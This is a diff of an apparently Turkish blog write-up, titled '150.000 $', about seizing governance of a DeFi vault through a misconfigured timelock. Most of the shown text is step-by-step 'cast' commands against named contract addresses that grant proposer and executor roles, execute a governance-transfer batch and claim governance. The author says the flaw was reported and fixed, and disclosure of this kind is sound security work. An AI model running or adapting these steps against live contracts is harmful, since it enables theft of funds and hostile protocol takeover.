@@ -1,7 +1,6 @@
 ---
 title: "150.000 $"
-description: ":s
-"
+description: ":s "
 ---
 
 Ufak uyarı: Göstermiş olduğum örnek origin altyapısını kullanmakta, açığı bildirdim ve kapattılar ancak siz genede o kapıyı çok zorlamayın :)))
@@ -37,9 +36,7 @@ elimizdeki bilgiler aşşağıdaki gibi
 
 Gerekenler: **minDelay**, **kimde hangi rol var**, **executor açık mı** (0x000…000 herkesi ifade eder).
 
-Copy
-
-```
+```bash
 # min delay
 cast call 0x31a91336414d3b955e494e7d485a6b06b55fc8fb "getMinDelay()(uint256)"
 
@@ -67,9 +64,7 @@ Bazı VaultCore’larda iki adım vardır: `transferGovernance(newGov)` → sonr
 
 #### **3.1 calldataları çıkar**
 
-Copy
-
-```
+```bash
 cast calldata "grantRole(bytes32,address)" <PROPOSER_ROLE_HASH> 0x12dC3655fAC6388ACFe6753C0214Ecec34B87217
 
 # grantRole(EXECUTOR_ROLE, 0x000...000)  (ya da kendi adresin)
@@ -80,9 +75,7 @@ cast calldata "transferGovernance(address)" 0x12dC3655fAC6388ACFe6753C0214Ecec34
 
 **3.2 batch parametrelerini kur**
 
-Copy
-
-```
+```bash
 TARGETS='["0x31a91336414d3b955e494e7d485a6b06b55fc8fb","0x31a91336414d3b955e494e7d485a6b06b55fc8fb","0xa3c0eCA00D2B76b4d1F170b0AB3FdeA16C180186"]'
 
 VALUES='[0,0,0]'
@@ -99,9 +92,7 @@ herkese açıksa herkes çağırabilir
 
 mindelay 0 geçtiyse direkt:
 
-Copy
-
-```
+```bash
 cast send 0x31a91336414d3b955e494e7d485a6b06b55fc8fb \
  "executeBatch(address[],uint256[],bytes[],bytes32,bytes32)" \
  "$TARGETS" "$VALUES" "$DATAS" $PREDECESSOR $SALT
@@ -115,9 +106,7 @@ Bu batch şunları yapar:
 
 ## **6- Claim Vakti**
 
-Copy
-
-```
+```bash
 cast send 0xa3c0eCA00D2B76b4d1F170b0AB3FdeA16C180186 "claimGovernance()"
 ```
 
